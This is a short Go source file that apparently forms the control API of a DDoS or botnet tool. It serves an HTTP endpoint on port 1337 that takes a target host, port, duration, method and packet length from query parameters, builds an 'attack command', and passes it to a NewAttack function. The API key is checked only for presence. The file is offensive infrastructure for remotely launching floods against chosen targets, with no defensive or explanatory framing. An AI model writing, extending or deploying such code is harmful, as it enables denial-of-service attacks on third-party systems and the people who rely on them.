package main

import (
	"fmt"
	"log"
	"net/http"
)

func ServeAPI() {
	http.HandleFunc("/api", func(w http.ResponseWriter, r *http.Request) {
		query := r.URL.Query()

		key := query.Get("key")
		host := query.Get("host")
		port := query.Get("port")
		time := query.Get("time")
		method := query.Get("method")
		length := query.Get("len")

		// Check if all required parameters are provided
		if key == "" || host == "" || port == "" || time == "" || method == "" {
			http.Error(w, "Missing required parameters", http.StatusBadRequest)
			return
		}

		// Construct the attack command
		command := fmt.Sprintf("%s %s %s dport=%s", method, host, time, port)
		if length != "" {
			command += fmt.Sprintf(" len=%s", length)
		}

		err, _ := NewAttack(command, false, false)
		if err != nil {
			http.Error(w, "Invalid method!", http.StatusBadRequest)
			return
		}

		// Return success response
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte(fmt.Sprintf("executed %s", command)))
	})

	err := http.ListenAndServe(":1337", nil)
	if err != nil {
		log.Printf("Error starting API server: %v", err)
		return
	}
}
